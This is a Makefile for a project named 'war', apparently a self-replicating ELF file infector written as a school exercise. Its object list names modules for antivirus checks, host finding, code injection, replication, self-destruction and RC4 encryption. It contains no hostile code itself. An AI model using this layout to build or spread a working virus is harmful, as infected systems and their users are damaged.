################################################################################
### INIT
################################################################################

NAME		= ../../war 

SRC_PATH_C	= src
SRC_PATH_LIB	= ../utils/src/c 
SRC_PATH_ASM	= ../utils/src/asm

OBJ_PATH_C	= obj/c
OBJ_PATH_ASM	= obj/asm

INC_PATH	= inc

CC		= gcc
AS		= nasm
CFLAGS		= -Wall -Wextra -Werror -masm=intel -D LOGGER -I $(INC_PATH)
ASFLAGS		= -f elf64

################################################################################
### OBJECTS 
################################################################################

OBJ_NAME_1	= main.o					\
		  __entry.o					\
		  						\
		  antivirus.o					\
		  init.o					\
		  find.o					\
		  host.o					\
		  criteria.o					\
		  text.o					\
		  note.o					\
		  header.o					\
		  injection.o					\
		  autodestruction.o				\
		  replicate.o					\
		  execution.o					\
		  						\
		  syscall.o					\
		  tools.o					\

OBJ_NAME_2	= rc4.o						\

OBJ_NAME_3	= __exit.o					\

OBJ =		$(addprefix $(OBJ_PATH_C)/,$(OBJ_NAME_1))	\
		$(addprefix $(OBJ_PATH_ASM)/,$(OBJ_NAME_2))	\
		$(addprefix $(OBJ_PATH_C)/,$(OBJ_NAME_3))	\

################################################################################
### RULES
################################################################################

.PHONY: all clean fclean re 

all: obj /tmp/logger $(NAME)

obj:
	mkdir -p obj
	mkdir -p obj/c
	mkdir -p obj/asm

/tmp/logger:
	touch /tmp/logger
	chmod 666 /tmp/logger

$(NAME): $(OBJ)
	$(CC) $(CFLAGS) $^ -o $@

$(OBJ_PATH_C)/%.o: $(SRC_PATH_C)/%.c Makefile
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJ_PATH_ASM)/%.o: $(SRC_PATH_ASM)/%.s Makefile
	$(AS) $(ASFLAGS) $< -o $@

clean:
	rm -rf $(OBJ)

fclean: clean
	rm -rf obj
	rm -rf /tmp/logger
	rm -rf $(NAME)

re: fclean all
